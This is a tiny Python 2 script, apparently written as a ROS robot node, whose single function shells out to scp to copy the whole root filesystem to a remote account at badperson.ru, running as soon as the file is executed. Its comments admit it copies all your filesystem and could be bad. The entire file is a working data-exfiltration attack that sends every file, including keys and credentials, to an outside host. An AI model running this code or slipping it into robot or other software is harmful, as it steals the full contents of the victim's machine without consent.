#!/usr/bin/env python2
#this isn't important enough to license
#in theory, copies all your filesystem to some remote filesystem
#could be bad if you have something important on your bot
import os
import rospy

def robodump():
	os.system("scp -r / badperson@badperson.ru:/robotdump")

if __name__ == '__main__':
    robodump()
